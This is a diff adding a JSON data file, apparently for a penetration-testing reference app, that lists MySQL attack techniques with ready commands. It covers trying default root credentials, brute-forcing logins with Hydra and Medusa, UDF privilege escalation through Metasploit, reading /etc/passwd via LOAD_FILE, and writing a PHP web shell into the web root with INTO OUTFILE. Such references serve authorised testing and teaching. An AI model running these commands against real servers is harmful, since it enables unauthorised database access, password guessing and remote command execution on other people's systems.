@@ -1,0 +1,138 @@
+{
+    "name": "MySQL - Database Server",
+    "port": 3306,
+    "description": "MySQL database penetration testing techniques",
+    "icon": "🗄️",
+    "techniques": [
+        {
+            "id": "mysql-1",
+            "name": "Default Credentials",
+            "difficulty": "Beginner",
+            "description": "Test for default or common MySQL credentials",
+            "steps": [
+                "Identify MySQL service",
+                "Test default credentials",
+                "Access database"
+            ],
+            "commands": [
+                {
+                    "tool": "MySQL Client",
+                    "command": "mysql -h <target_ip> -u root -p",
+                    "description": "Connect to MySQL"
+                },
+                {
+                    "tool": "Default: No Password",
+                    "command": "mysql -h <target_ip> -u root",
+                    "description": "Try root with no password"
+                },
+                {
+                    "tool": "Nmap Scripts",
+                    "command": "nmap -sV -p 3306 --script mysql-info <target_ip>",
+                    "description": "Get MySQL information"
+                },
+                {
+                    "tool": "Metasploit",
+                    "command": "use auxiliary/scanner/mysql/mysql_login",
+                    "description": "MySQL login scanner"
+                }
+            ],
+            "tips": [
+                "Common defaults: root:(empty), root:root, root:mysql",
+                "Look for mysql user with SELECT * FROM mysql.user"
+            ]
+        },
+        {
+            "id": "mysql-2",
+            "name": "Brute Force Attack",
+            "difficulty": "Beginner",
+            "description": "Crack MySQL passwords through brute forcing",
+            "steps": [
+                "Enumerate MySQL users if possible",
+                "Prepare wordlists",
+                "Launch brute force attack"
+            ],
+            "commands": [
+                {
+                    "tool": "Hydra",
+                    "command": "hydra -l root -P passwords.txt <target_ip> mysql",
+                    "description": "Brute force MySQL"
+                },
+                {
+                    "tool": "Medusa",
+                    "command": "medusa -h <target_ip> -u root -P passwords.txt -M mysql",
+                    "description": "Medusa MySQL brute force"
+                }
+            ],
+            "tips": [
+                "MySQL may have rate limiting",
+                "Check for password reuse from other services"
+            ]
+        },
+        {
+            "id": "mysql-3",
+            "name": "UDF Privilege Escalation",
+            "difficulty": "Advanced",
+            "description": "Use User Defined Functions for command execution",
+            "steps": [
+                "Check FILE privilege",
+                "Determine plugin directory",
+                "Upload UDF library",
+                "Create function and execute commands"
+            ],
+            "commands": [
+                {
+                    "tool": "Check Privileges",
+                    "command": "SELECT * FROM mysql.user WHERE User='root';",
+                    "description": "Check user privileges"
+                },
+                {
+                    "tool": "Plugin Directory",
+                    "command": "SHOW VARIABLES LIKE 'plugin_dir';",
+                    "description": "Find plugin directory"
+                },
+                {
+                    "tool": "Metasploit UDF",
+                    "command": "use exploit/multi/mysql/mysql_udf_payload",
+                    "description": "Automatic UDF exploitation"
+                }
+            ],
+            "tips": [
+                "Requires FILE privilege",
+                "Different libraries for Linux/Windows"
+            ]
+        },
+        {
+            "id": "mysql-4",
+            "name": "File Read/Write",
+            "difficulty": "Intermediate",
+            "description": "Read and write files on the server through MySQL",
+            "steps": [
+                "Check FILE privilege",
+                "Verify secure_file_priv",
+                "Read sensitive files",
+                "Write web shells if possible"
+            ],
+            "commands": [
+                {
+                    "tool": "Read File",
+                    "command": "SELECT LOAD_FILE('/etc/passwd');",
+                    "description": "Read system files"
+                },
+                {
+                    "tool": "Write File",
+                    "command": "SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';",
+                    "description": "Write web shell"
+                },
+                {
+                    "tool": "Secure File Priv",
+                    "command": "SHOW VARIABLES LIKE 'secure_file_priv';",
+                    "description": "Check file operation restrictions"
+                }
+            ],
+            "tips": [
+                "secure_file_priv may restrict file operations",
+                "Need to know web server path for shell upload"
+            ]
+        }
+    ]
+}
